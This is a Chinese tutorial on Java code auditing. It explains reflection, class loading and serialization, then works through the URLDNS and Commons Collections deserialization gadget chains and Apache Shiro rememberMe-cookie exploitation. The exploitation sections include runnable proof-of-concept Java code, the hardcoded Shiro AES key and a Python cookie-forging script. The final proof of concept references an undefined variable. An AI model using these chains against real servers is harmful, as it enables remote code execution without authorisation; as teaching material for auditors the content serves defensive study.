在实践过程中，可通过人工审查或者自动化工具的方式，对程序源代码进行检查和分析,发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。

#### 代码审计的意义：

随着Java Web应用越来越广泛，安全审计已经成为安全测试人员需要直面的工作。

虽然PHP在中小型互联网企业仍占据一席之地，但主流的大型应用中，java仍是首选的开发语言，国内外大型企业大多以java作为核心的开发语言。

因此对于安全从业者来说，java代码审计已经成为所需要掌握的关键技能。

#### 代码审计常规分析方法

对于代码审计常规分析方法一般可分为以下三种：

1. （1）通读源代码：这种审计手法往往能够发现隐藏较深的安全问题，一般从程序的入口函数开始读。

   但其缺点也十分明显，需要通读整个源代码的逻辑，因此十分耗费时间。

2. （2）关键函数回溯：这种方法比第一种方法效率大大提升，但是很难发现隐藏极深的安全问题。

   对于关键函数回溯法，首先需定位到敏感函数以及参数，随后同步回溯参数的赋值过程，判断是否可控以及是否经过过滤等。

3. （3）追踪功能点：这种方法需要审计人员有一定的渗透测试基础，根据自己的经验判断可能存在问题的路由或功能点，并针对该功能点进行通读。

   例如，文件上传漏洞可直接通过定位上传函数来发现。 

### 代码审计-Java进阶

动态语言在程序运行时，可以改变程序结构或变量类型如（Python, Ruby, JavaScript），

但是Java有一定的动态性，可以通过反射机制、字节码操作获得类似动态语言的特性，

Java语言又可以称为 “**准动态语言**”。

#### 什么是反射呢？

Java 反射机制是在运行状态中，

- 对于任意一个类，都能够知道这个类的所有属性和方法；
- 对于任意一个对象，都能够调用它的任意一个方法和属性；

这种动态获取的信息以及动态调用对象的方法的功能称为 Java 语言的反射机制。

反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法

##### 正射

**反射**之中包含了一个「**反**」字，所以想要解释反射就必须先从「**正**」开始解释。

一般情况下，我们使用某个类时必定知道它是什么类，是用来做什么的。

于是我们直接对这个类进行实例化，之后使用这个类对象进行操作

```bash
Apple apple = new Apple(); //直接初始化，「正射」
apple.setPrice(4);
```

##### 反射

反射则是**一开始并不知道我要初始化的类对象是什么**，自然也**无法使用 new 关键字来创建对象**了。

这时候，我们使用 JDK 提供的**反射 API** 进行**反射调用**。

```java
Class clz = Class.forName("com.zcsz.reflect.Apple");
Method method = clz.getMethod("setPrice", int.class);
Constructor constructor = clz.getConstructor();
Object object = constructor.newInstance();
method.invoke(object, 4);
```

#### 类对象的获取API：

1. 通过对象获取，`obj.getClass();`
2. 通过类路径名获取，`Class.forName("com.zcsz.Apple");`
3. 通过类名获取，`Object.class;`

##### 其他常用API：

1. `getField、getMethod和getCostructor`方法可以获得**指定名字的域、方法和构造器**。
2. `getFields`、`getMethods`和`getCostructors`方法可以获得**类提供的public域、方法和构造器数组，其中包括超类的共有成员**。
3. `getDeclatedFields`、`getDeclatedMethods`和`getDeclaredConstructors`方法可以获得**类中声明的全部域、方法和构造器，其中包括私有和受保护的成员，但不包括超类的成员**。

#### 反射的调用流程：

1. 编写完Java项目之后，**java文件**都会被编译成一个**.class文件**

2. 这些**class文件**在程序运行时会被`ClassLoader`加载到`JVM`中，当一个类被加载以后，JVM就会在内存中自动产生一个**Class对象**。

3. 通过**Class对象**获取 **Field（属性）、Method（方法）、Construcor（构造函数）**我们平时通过new的形式创建对象，本质上就是通过Class来创建个新对象

![image-20241029104141892](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029104141892.png)

#### Class对象

Class对象 是内存中对应类的对象。

一个类被加载后，JVM会创建一个对应类的Class对象，**类的整个结构信息**会放到对应的 Class对象 中。

这个 Class对象 就像一面镜子一样，通过这面镜子我们可以看到对应类的全部信息。

**加载完类**之后，在堆内存中，就产生了一个**Class类型的对象**（一个类只有一个 Class对象）。

这个对象也称为 反射对象。

**同一个类，它只会被加载一次，同一个类只会有一个反射对象。**

![image-20241029104227408](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029104227408.png)

##### 类加载机制：

虚拟机把描述类的数据从Class文件加载到内存，并对数据进行校验、转换解析和初始化，

最终形成可以被虚拟机直接使用的Java类型，这就是虚拟机的类加载机制。

##### 类加载的时机：

1. 遇到`new`（比如new Student()）、`getstatic`和`putstatic`（读取或设置一个类的静态字段，如下代码，读取被final修饰并已在编译器把结果放入常量池的静态字段除外）、`invokestatic`（调用类的静态方法）这四条指令时，**如果对应的类没有初始化，则要对对应的类先进行初始化**。
2. 使用`java.lang.reflect`包方法时对类进行反射调用的时候。
3. 初始化一个类的时候发现其父类还没初始化，要**先初始化其父类**。
4. 当虚拟机开始启动时，用户需要指定一个主类（main），虚拟机会限制性这个主类的初始化。

##### 类加载的过程：

![image-20241029091704607](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029091704607.png)

加载：**class文件-> class对象**；

![image-20241029104256452](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029104256452.png)

**加载过程主要是靠类加载器实现的**，包括**用户自定义类加载器**。

在加载过程中，`JVM`主要做以下3件事：

1. 通过一个**类的全限定名**来获取定义此**类的二进制字节流**（**class文件**）。

   在程序运行过程中，当要访问一个类时，若发现这个类尚未被加载，并满足类初始化的条件时，就根据要被初始化的这个类的全限定名找到该类的二进制字节流，开始加载过程

2. 将这个**字节流的静态存储结构**转化为方**法区的运行时数据结构**（即**Class对象**）

3. 在内存中创建一个该类的`java.lang.Class`对象，作为方法区该**类的各种数据的访问入口**

程序在运行中所有对该类的访问都通过这个类对象，也就是这个Class对象是提供给外界访问该类的接口。

##### 类加载器

![image-20241029104340216](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029104340216.png)

###### 启动类加载器：

由`C++`实现，**不是**`ClassLoader`子类。

负责加载`JAVA_HOME\lib`目录中的，或通过`-Xbootclasspath`参数指定路径中的，且被虚拟机认可（按文件名识别，如rt，jar）的类。

###### 扩展类加载器：

负责加载`JAVA_HOME\lib\ext`目录中的，或通过`java.ext.dirs`系统变量指定路径中的类库。

###### 应用程序类加载器：

负责加载用户路径（`classpath`）上的类库。

###### 自定义类加载器：

上述的加载器只能加载指定目录下的`jar`和`class`，如果想加载其他位置的jar或类时，则需要实现自定义类加载器来加载。

#### 双亲委派模型：

加载过程中会**先检查类是否被已加载**，检查顺序是**自底向上**，从`Custom ClassLoader`到`BootStrap ClassLoader`组层检查，

只要某个classloader已加载就视为已加载此类，保证此类只加载一次。

而**加载的顺序**是**自顶向下**，也就是**由上层来组层尝试加载此类**。

这种类加载的层次关系就是双亲委派模型。

通过层次化的委派机制，确保**类的唯一性**和**核心类**的**安全性**，同时提高了加载效率。

![image-20241029104357403](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029104357403.png)

##### 例如：

假设我们有以下类结构：

```bash
java.lang.Object（由Bootstrap ClassLoader加载）
java.util.ArrayList（由Extension ClassLoader加载）
com.example.MyArrayList（由应用类加载器加载）
```

##### 加载过程示例

###### 请求加载类：

假设你的应用程序中有一段代码需要使用 `com.example.MyArrayList` 类。

###### 类加载器的层次结构：

- 应用类加载器（`AppClassLoader`）

- 扩展类加载器（`ExtClassLoader`）
- 启动类加载器（`Bootstrap ClassLoader`）

##### 委派机制：

**应用类加载器**首先会查看其**父类加载器**（即扩展类加载器）**是否已经加载**了 `com.example.MyArrayList`。

如果没有，**扩展类加载器**会**继续查找**其**父类加载器**（即**启动类加载器**），看看是否加载了该类。

##### 核心类的优先加载：

**启动类加载器**会检查 `java.lang.Object` 和**其他核心类**。

如果在这些**核心类**中**找到名称相同的类**（比如 java.util.ArrayList），则会**优先加载核心类**。

此时，**扩展类加载器**和**应用类加载器**都**无法加载**与**核心类同名的类**。

##### 最终加载：

如果 `com.example.MyArrayList` **不在任何父类加载器**中找到，**应用类加载器才会尝试自己去加载这个类**。

**双亲委派的核心思想： 向上询问，向下加载。**

##### WebappClassLoader

`tomcat`利用了**自定义加载器**(WebappClassLoader)**打破了双亲委派模型**；

![image-20241029104453206](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029104453206.png)

假设有两个 Web 应用，分别依赖于不同版本的 `commons-logging` 库：

应用 A 依赖于 `commons-logging-1.0.jar`

应用 B 依赖于 `commons-logging-1.2.jar`

在**严格的双亲委派模型**下，可能会**导致加载错误的版本**。



但由于 `Tomcat` 为每个 Web 应用**创建了独立的类加载器**，应用 A 和应用 B 可以**各自加载自己的版本**，而**不会互相干扰**。

**做到了应用隔离**：每个应用可以使用不同版本的类库，而不必担心其他应用的影响。

**打破父子关系**：当应用请求加载类时，`WebappClassLoader` 会**首先尝试加载自己负责的类**，如果没有找到再向父加载器寻求帮助，而不是严格遵循父加载器优先的原则。


主张“谁的孩子谁抱走”原则

### 代码审计-反序列化 

#### 为什么需要序列化？

在当今的网络社会，我们需要在网络上传输各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都是以**二进制序列的形式**在网络上传送的，

那么发送方就需要将这些**数据序列化为字节流**后传输，而接收方接到**字节流后需要反序列化为相应的数据类型**。

当然接收方也可以将接收到的**字节流存储到磁盘**中，等到以后**想恢复的时候再恢复**。

#### 什么是序列化：

把**对象转换为字节序列的过程**称为对象的序列化。

#### 序列化的本质是什么？

将复杂数据结构转化为**易于存储**和**传输的形式**的技术，对于现代软件开发中的数据管理、网络通信和系统集成起着至关重要的作用。

![image-20241029104525727](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029104525727.png)

#### Java中的序列化与反序列化：

Java序列化是通过**对象输入输出流**(`ObjectInputStream`和`ObjectOutputStream`)实现的。

序列化时需要实现`Serializable`/ `Externalizable` 接口,然后使用`ObjectOutputStream`输出对象,反序列化时使用`ObjectInputStream`从流中恢复对象。

#### 在Java中实现序列化的方式：

##### 方式一：实现 Serializable 接口序列化

这种方式最为常用且常见，只需要**对需要序列化的类实现 Serializable** 即可，

对于**不希望进行序列化的**，可以使用 `transient` 关键词进行修饰（即**瞬时变量**）。

###### 这种方式序列化的特征：

1、 `Serializable` 接口仅仅是**一个标记接口**，**不包含任何方法**；

2、对于`Serializable`对象来说，**对象完全以它存储的二进制位为基础来构造**，（反序列化）**不会调用构造器**。

##### 方式二：实现 Externalizable 接口序列化

这种方式可以**实现序列化的完全自定义**：

**所有成员变量**是否序列化都需要在 `writeExternal()`、`readExternal()`方法中写出；

且可以**完全自定义序列化方式**（在 `writerExternal()`、`readExternal()`方法中）。

当然，实现 `Externalizable` 接口必须要**重写这两个方法**。

###### 这种方式序列化的特征：

1、必须重写 `writerExternal()`、`readExternal()`两个方法，并在两个方法中**写出所有需要序列化的成员变量**；

2、对于 `Externalizable`对象来说，必须要有**无参public构造器**，不然会报出 `InvalidClassException` 异常。

#### 序列化例子：

https://github.com/frohoff/ysoserial.git

```java
class User implements Serializable{
    private String name;
    private transient int age;  // 这里使用了transient 关键字，也就是标记之后age不会序列化。
    private float height;

public User(String name, int age, float height) {
    this.name = name;
    this.age = age;
    this.height = height;
}

public void info(){
    System.out.println("Name: "+name+", Age: "+age+", Height: "+height);
}

}

public static void main(String[] args){
        User user = new User("zcsz", 22, 182);
        try {
            FileOutputStream fos = new FileOutputStream("./user.ser");  //文件输出流向指定文件("./user.ser") 中写入字节
            ObjectOutputStream os = new ObjectOutputStream(fos); 
            os.writeObject(user); //对象输入流，将 User 对象序列化为字节流并写入文件

        FileInputStream fis = new FileInputStream("./user.ser"); //创建一个 FileInputStream，用于从 user.ser 文件中读取字节
        ObjectInputStream oi = new ObjectInputStream(fis); //通过 ObjectInputStream 将字节流反序列化为 User 对象
        User user1 = (User)oi.readObject();
       user1.info();
    } catch (FileNotFoundException e) {
       e.printStackTrace();
   } catch (IOException e) {
        e.printStackTrace();
   }
    catch (ClassNotFoundException e) {
      e.printStackTrace();
    }
}

}
```

在刚才的例子中展示了**序列化和反序列化**的过程，用工具打开**序列化后**的`user.ser`文件可以看到如下内容：

![image-20241029092551880](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029092551880.png)

在换成**反序列化**文件之后在打开可以看到如下内容：

![image-20241029092556434](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029092556434.png)

##### SerializationDumper

在通过`SerializationDumper`(**序列化转储器**)工具进行转储解析之后出现如下内容：

工具地址：https://github.com/NickstaDB/SerializationDumper

通过不同的序列化文件可以看出前四个字节具有一定的规则性。

那么根据查找Oracle官网中JDK对相关文献可以看到描述如下：

第一部分是**序列化文件头**(标志位)

```bash
ac ed：STREAM_MAGIC声明使用了序列化协议 (魔数)
00 05：STREAM_VERSION序列化协议版本
73：TC_OBJECT声明这是一个新的对象
```

![image-20241029104643926](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029104643926.png)

![image-20241029104649808](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029104649808.png)

#### 序列化前和序列化后对象的地址与原来的是否相同？

```bash
public class Serialize implements Serializable{
    private static final long serialVersionUID = -5211389707739541364L;
    public int num = 1390;
    public void checkIsSame()
    {
        Serialize serialize1 = new Serialize();
        try {
            FileOutputStream fos = new FileOutputStream("serialize.obj");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(serialize1);
            System.out.println("序列化结束");}catch (IOException e){e.printStackTrace();}
        Serialize serialize2 = null;
        try {
            FileInputStream fis = new FileInputStream("serialize.obj");
            ObjectInputStream ois = new ObjectInputStream(fis);
            serialize2 = (Serialize) ois.readObject();
             System.out.println("反序列化结束");}
        catch (ClassNotFoundException | IOException e){ e.printStackTrace();}
        System.out.println("序列化和反序列化的对象相同否？"+(serialize1==serialize2));
    }

public static void main(String[] args) 
{
    Serialize serialize = new Serialize();
    serialize.checkIsSame();
}

}
```

##### 运行结果：

- 序列化结束
- 反序列化结束
- 序列化和反序列化的对象相同否？false

##### 原因：

序列化前后对象的地址不同了，但是内容是一样的，而且对象中包含的引用也相同。

也就是说序列化是一个**深拷贝**的操作，序列化前和序列化后是两个独立的对象。

#### 什么是深拷贝什么是浅拷贝？

##### 浅拷贝：

创建一个新对象，但对于原对象中的引用类型属性，**新对象和原对象共享同一内存地址**。

如果修改了其中一个对象的引用类型属性，另一个对象也会受到影响。

##### 深拷贝：

创建一个新对象，**并递归地复制原对象的所有属性**，包括引用类型属性，确保**新对象和原对象之间完全独立**。

修改新对象的属性不会影响原对象。

浅拷贝只是增加了一个指针指向已存在的内存地址，而深拷贝是增加了一个指针并且申请了一个新的内存，使这个增加的指针指向这个新的内存。

深拷贝是指源对象与拷贝对象互相独立，其中任何一个对象的改动都不会对另外一个对象造成影响。

**使用深拷贝的情况下，释放内存的时候不会因为出现浅拷贝时释放同一个内存的错误。**

Java 的序列化被视为深拷贝，当你将一个对象进行序列化时，整个对象的状态（包括其私有属性）都会被转储到字节流中；

反序列化后，得到的是一个全新的对象，且所有的引用类型属性也会被复制，而不是直接指向原对象，从而确保序列化和反序列化后得到的对象相互独立。

![image-20241029104803326](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029104803326.png)

#### 如何控制对象的反序列化行为呢？

比如在**反序列化过程中初始化**某些东西等等。

其实想要实现上述需求只需要在控制的对象中重写`readObject()`方法即可。

```bash
class User implements Serializable{
    private String name;
    private transient int age;
    private float height;

public User(String name, int age, float height) {
    this.name = name;
    this.age = age;
    this.height = height;
}

public void info(){
    System.out.println("Name: "+name+", Age: "+age+", Height: "+height);
}

 private void readObject(ObjectInputStream input) throws IOException, ClassNotFoundException{
     input.defaultReadObject();
     System.out.println("Hello");
 }

}
```

源码分析：实际上就是如果重写了`readObject()`之后就会**通过反射的方式**在反序列化时执行。

![image-20241029104832332](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029104832332.png)

#### 知道了执行时机以及执行方式，如何利用此方式执行恶意代码呢？

其实反序列化引发的安全问题的根本点就在这里，本来是一种很好的解决方案结果却被很多Hacker利用。

```bash
class User implements Serializable{
    private String name;
    private transient int age;
    private float height;

public User(String name, int age, float height) {
    this.name = name;
    this.age = age;
    this.height = height;
}

public void info(){
    System.out.println("Name: "+name+", Age: "+age+", Height: "+height);
}

 private void readObject(ObjectInputStream input) throws IOException, ClassNotFoundException{
     input.defaultReadObject();
     Runtime.getRuntime().exec("calc");  //恶意代码。
 }

}
```

## 08.代码审计-源码分析

### 代码审计-源码分析

#### URLDNS链分析：

URLDNS这条链，并不能用来执行其他命令来RCE，只能用来发送一次DNS请求到我们指定的网站上，然后我们就能查看是否有请求记录而来判断是否存在Java的反序列化漏洞。

简短的来说：**URLDNS只能用来探测和验证是否存在漏洞**。

看似没什么用，但其实在渗透测试的实战中，这种用DNS请求来探测和验证漏洞的**点到为止的思想**还是挺常用的。

而且这个Gadget还不需要任何其他的依赖，原生Java就能够成功调用成功。

#### 目的：

利用`readObject`为突破点在反序列化时触发DNS查询。

在`HashMap`的入口类重写`readObject`方法，并且入口类可以为任意对象，也就是通过上述的特征可以被反序列化利用。

也就是`HashMap`整合了URL类实现了反序列化的攻击检测：

#### 调用链如下：

![image-20241029093525401](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029093525401.png)

也就是`HashMap`通过`put`方法，对`key`进行`HashCode`，而URL类中正好重写了`HashCode`，

所以将URL类作为HashMap的key即可，这样在借助`DNSLOG`等平台可以进行反序列化的验证。

#### 用代码验证前面的猜想：

```JAVA
 public static void main(String[] args) throws MalformedURLException {
        HashMap<URL, Integer> urlIntegerHashMap = new HashMap<>();
        URL url = new URL("http://e82253f1.log.dnslog.biz");
        urlIntegerHashMap.put(url,123);
    }
```

在详细的跟进源码一探究竟。

https://dnslog.org/

![image-20241029105010047](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029105010047.png)

![image-20241029093011278](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029093011278.png)

![image-20241029093040217](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029093040217.png)

跟踪完源码之后会有一个疑问，

#### 如何在反序列化的时候让目标对象去执行呢？

也就是不在序列化阶段执行，而**在反序列化的时候**让目标对象去执行这个PalyLoad。

如果细心分析源码就会在URL类的`hashCode`方法中有一个条件当`this.hashCode != -1`的时候会返回该`hashCode`值，不会去实际执行目标对象的hashCode，

也就是说我们可以在调用`hashMap.put`之前将hashCode值改为**非-1**，在hashMap.put之后将hashCode值改为-1，这样就保证了在序列化阶段不去执行而在反序列化阶段去执行。

那么如何做呢？首先看URL类中`hashCode`为 `private`属性Int类型的一个值，所以想要改变其值我们想到的应该是**利用反射技术**来实现。

![image-20241029105159808](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029105159808.png)

#### 最终的PalyLoad：

##### 序列化：

不在序列化阶段执行

```java
public class DnsUrlT {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        HashMap<URL, Integer> urlIntegerHashMap = new HashMap<>();
        URL url = new URL("http://c4c2b65d.log.dnslog.biz");
        Class clz = URL.class;
        //hashcode改为1
        Field hashCode = clz.getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url,111);
        urlIntegerHashMap.put(url,123);
        //hashcode改回-1
        hashCode.set(url,-1);
        Serialize(urlIntegerHashMap);
    }
    public static void Serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("DnsUrl.ser"));
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
    }
}
```

#### 客户端的反序列化：

在反序列化的时候执行

```java
public static void main(String[] args) throws Exception{
        Deserialize();
}
private static void Deserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("DnsUrl.ser"));
        objectInputStream.readObject();
}
```

![image-20241029105214015](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029105214015.png)

####  Commons Collections是什么？

`Java Collections Framework` 是 JDK 1.2 中的一项重要新增功能。

它添加了许多强大的**数据结构**，可以加速最重要的 Java 应用程序的开发。

从那时起，它已成为 Java 中公认的集合处理标准。

`Commons-Collections`试图通过提供新的接口、实现和实用程序来构建JDK类。

像许多常见的应用如`Weblogic`、`WebSphere`、`Jboss`、`Jenkins`等都使⽤了`Apache Commons Collections`工具库，当该工具库出现反序列化漏洞时，这些应用也受到了影响，这也是反序列化漏洞如此严重的原因。

> URLDNS链和CC链 

#### 再次学习反射：

`Runtime.getRuntime().exec("calc");` 上述命令**如何利用反射实现**呢？

##### 上述命令**如何利用反射实现**呢？

用**反射的方法**执行`Runtime.getRuntime().exec("calc")`的语句是这样的：

```bash
//获取Runtime类对象
Class<?> clazz = Runtime.class;
//获取getRuntime方法
Method getRuntimeMethod = clazz.getMethod("getRuntime", null);
//获取Runtime对象
Runtime runtime = (Runtime) getRuntimeMethod.invoke(clazz, null);
//获取exec方法
Method execMethod = clazz.getMethod("exec", String.class);
//反射执行exec("calc")
execMethod.invoke(runtime, "calc");
```

##### 如何利用Commons Collections中的相关类来实现代码呢？

`Runtime.getRuntime().exec("calc")`

```java
Transformer[] transformers = {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
ChainedTransformer ct = new ChainedTransformer(transformers);
ct.transform("2");  //调启
```

上述代码是利用`Commons Collections` 类库中 **ConstantTransformer 类**、**InvokerTransformer 类**、**ChainedTransformer类**、**Transformer[] 数组**等方式来组合实现的。

- `ConstantTransformer` 类： `ConstantTransformer` 是 `Transformer` 的一个实现，**它始终返回一个指定的常量值**。(接什么返什么)

- `InvokerTransformer`类：定义: `InvokerTransformer` 是 Transformer 的另一种实现，**它用于调用某个对象的方法**。

  构造函数: 需要三个参数：方法名，方法参数类型的数组，要传递给方法的参数的数组

- `Transformer[]` 数组：定义: `Transformer[]` 是一个 `Transformer` 类型的数组。

  用途: **用于将多个变换器组合在一起**，以便按顺序执行一系列转换操作。

  在你的代码中，这个数组包含了多个变换器，每个变换器负责一个具体的操作。

- `ChainedTransformer`：能够**将多个变换器串联起来**，使得输入经过一系列的处理后，可以最终执行出一些操作。

经过源码分析后发现，`ct.transform("2")` 代码执行之后开始做起调，在方法中实际做的事情就是**遍历和调用各个元素的transform()方法**。

##### 那么谁又会调用同样的方法呢？

通过寻找源代码发现，在`LazyMap`的`get()`方法中正好也调用了`transform()`方法。那么代码就可以变换成如下方式：

![image-20241029105345280](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029105345280.png)

![image-20241029105352817](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029105352817.png)

​    

```java
 Transformer[] transformers = {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
        ChainedTransformer ct = new ChainedTransformer(transformers);
        Map decorate = LazyMap.decorate(new HashMap(), ct); //通过decorate传值，生成一个LazyMap对象
        decorate.get("1"); //调启
```

如果想要实现**序列化**和**反序列化**目前的结果显然是不够的，

##### 那么LazyMap和哪个类的什么方法会有联系呢？

答案是`TiedMapEntry`类，`TiedMapEntry`的`hashCode`方法调用了`getValue`，getValue调用了get方法，

所以可以用`TiedMapEntry`的`hashCode`方法调用`LazyMap`的`get`方法。

![image-20241029093312330](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029093312330.png)

##### 源码

```java
Transformer[] transformers = {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer ct = new ChainedTransformer(transformers);
        Map decorate = LazyMap.decorate(new HashMap(), ct);
        TiedMapEntry t = new TiedMapEntry(decorate, "T");
        t.hashCode();//起调
```

##### 整个完整的利用链

```java
HashMap.readObject()
HashMap.hash()
    TiedMapEntry.hashCode()
    TiedMapEntry.getValue()
        LazyMap.get()
            ChainedTransformer.transform()
                InvokerTransformer.transform()
                    Method.invoke()
                        Runtime.exec()
```

该条利用链是继DNSURL链之后最简单也是最实用的链子，

原因就是该条链不受JDK版本的限制，只是限定了`commons collections`类库的版本要**小于等于3.2.1**即可。

##### 完整POC：

```java
  Transformer[] transformerArray=new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformerArray);
        Map<Object, Object> map = new HashMap<Object, Object>();
        Map<Object, Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"any1");
        HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
        hashMap.put(tiedMapEntry,"any2");
        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factory = lazyMapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);
        lazyMap.remove("any1");

        //序列化：
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("PayLoad.bin"));
        oos.writeObject(object);
```

### Shiro漏洞

#### Shiro漏洞的原理

在`Shiro`中，当我们勾选`remember me`(记住我)时，会将我们的**身份信息使用AES加密后序列化**后存储在名为`remember-me`的`Cookie`中，

由于`AES`是对称加密，在`Shiro<=1.2.4`里在源码中**硬编码**了一个**默认密钥**，因此当我们**知道密钥后**攻击者可以使用`Shiro`的默认密钥**伪造用户Cookie**，当我们下次请求时服务器会读取Cookie并对解密后的结果进行**反序列化**。

**影响版本**：`Apache Shiro < 1.2.4`，在`1.2.4`之后，ASE秘钥就不为默认了，**需要获取到Key**才可以进行渗透。

**特征判断**:

**shiro反序列化的特征**：在返回包的 `Set-Cookie` 中存在 `rememberMe=deleteMe` 字段

![image-20241029105555386](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029105555386.png)

#### 搭建环境

https://cloud.tencent.com/developer/article/1078421

https://blog.csdn.net/jxy158212/article/details/136219249

#### 特征检测

首先利用工具对在**登录页面**选中**记住我**之后**在点击登录的时候**

**利用Burp进行抓包**如下图所示：

返回包中有`rememberMe=deleteMe`，基本可以确定网站是`Apache Shiro`搭建。

![image-20241029105617037](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029105617037.png)

#### 漏洞分析

在登录界面如果勾选了`rememberMe`(记住我)

并且在登录成功之后会调用`AbstractRememberMeManager`类中的`onSuccessfulLogin()`方法；如下图所示：

![image-20241029093813419](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029093813419.png)

首先在图中可以看出在方法中主要有forgetIdentity()方法目的是要先清除之前的身份信息，

然后在去判断是否勾选了rememberMe(记住我)那么如果勾选了则会执行rememberIdentity()方法，在跟踪该方法代码往下看：

![image-20241029105643967](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029105643967.png)

在该方法中又调用了rememberIdentity()方法：

![image-20241029105647215](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029105647215.png)

在这个方法中主要有两个方法，convertPrincipalsToBytes()方法主要是为了序列化：

![image-20241029105712940](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029105712940.png)

通过序列化的代码发现其实在序列化过程中是对序列化内容进行了一个AES对称加密

并且密钥是以**硬编码**的方式写在类中根据阅读源码发现其密钥为：`kPH+bIxk5D2deZiIxcaaaA==`

而重点是要看rememberSerializedIdentity()方法，在rememberSerializedIdentity()方法中对AES加密的数据在进行base64编码，

然后在放到Cookie中返回。

![image-20241029105731202](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029105731202.png)

通过阅读源码可以将加密过程总结如下：**序列化-->AES加密-(固定密钥)->base64编码-->发送cookie；**

那么我们就可以根据上述过程将自己的PayLoads进行RCE。


那么如何实现呢？其实可以先利用DNSURL链来做一个测试；然后在编写恶意脚本进行攻击这里只展示弹计算器；



#### 如何实现对DNSURL链进行打入整合呢？

首先利用前面编写的DNSURL链代码生成反序列化文件，在代码中要指定DNSLOG平台，

然后在通过代码的方式将其进行AES加密以及Base64编码。

DNSURL链生成序列化文件部分已经讲完了，

#### 那么如何实现AES加密以及Base64编码呢？

可以利用Python实现，源码如下：

```python
from email.mime import base
from pydoc import plain
import sys
import base64
from turtle import mode
import uuid
from random import Random
from Crypto.Cipher import AES

def get_file_data(filename):
    with open(filename, 'rb') as f:
        data = f.read()
        return data
def aes_enc(data):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))
    return ciphertext
def aes_dec(enc_data):
    enc_data = base64.b64decode(enc_data)
    unpad = lambda s: s[:-s[-1]]
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = enc_data[:16]
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    plaintext = encryptor.decrypt(enc_data[16:])
    plaintext = unpad(plaintext)
    return plaintext
if __name__ == "__main__":
    data = get_file_data("dnsurl.bin")
    print(aes_enc(data))
```

运行上述python脚本

将脚本利用burp打入到remeberMe中，注意**要删除Cookie**中的`JSESSIONID`

以下是结果

![image-20241029093907851](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029093907851.png)

